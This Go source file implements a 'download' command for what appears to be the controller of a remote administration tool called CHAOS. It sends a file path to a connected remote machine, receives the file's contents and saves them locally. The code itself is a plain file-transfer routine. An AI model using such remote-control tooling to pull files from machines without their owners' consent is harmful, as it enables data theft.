package download

import (
	"encoding/json"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	osUtil "github.com/tiagorlampert/CHAOS/internal/util/os"
	c "github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"net"
	"os"
	"path/filepath"
)

type DownloadUseCase struct {
	Connection net.Conn
}

func NewDownloadUseCase(conn net.Conn) usecase.Download {
	return &DownloadUseCase{
		Connection: conn,
	}
}

func (d DownloadUseCase) Validate(param []string) error {
	if len(param) != 2 || !util.Contains(param, "download") {
		fmt.Println(c.Yellow, "[!] Invalid parameters to download!")
		return fmt.Errorf("invalid parameters")
	}
	return nil
}

func (d DownloadUseCase) File(filepath string) {
	download, err := json.Marshal(models.Download{
		Filepath: filepath,
	})
	if err != nil {
		log.Error(err)
	}

	err = network.Send(d.Connection, models.Message{
		Command: "download",
		Data:    download,
	})
	if err != nil {
		log.WithField("cause", err.Error()).Error("error sending request")
		return
	}

	response, err := network.Read(d.Connection)
	if err != nil {
		fmt.Println(c.Red, "[!] Error receiving response!")
		return
	}

	if response.Error.HasError {
		fmt.Println(c.Red, "[!] Error processing file!", response.Error.Message)
		return
	}
	if len(response.Data) == 0 {
		fmt.Println(c.Yellow, "[!] Specified file not found or empty!")
		return
	}

	filename := buildFilename(filepath)
	if err := osUtil.WriteFile(filename, response.Data); err != nil {
		fmt.Println(c.Red, "[!] Error saving file!")
		return
	}

	fmt.Println(c.Green, fmt.Sprintf("[*] File saved successfully at %s!", filename))
}

func buildFilename(path string) string {
	_, file := filepath.Split(path)
	return fmt.Sprintf("%s%s%s", util.TempDirectory, string(os.PathSeparator), fmt.Sprint(util.GetDateTime(), "_", file))
}
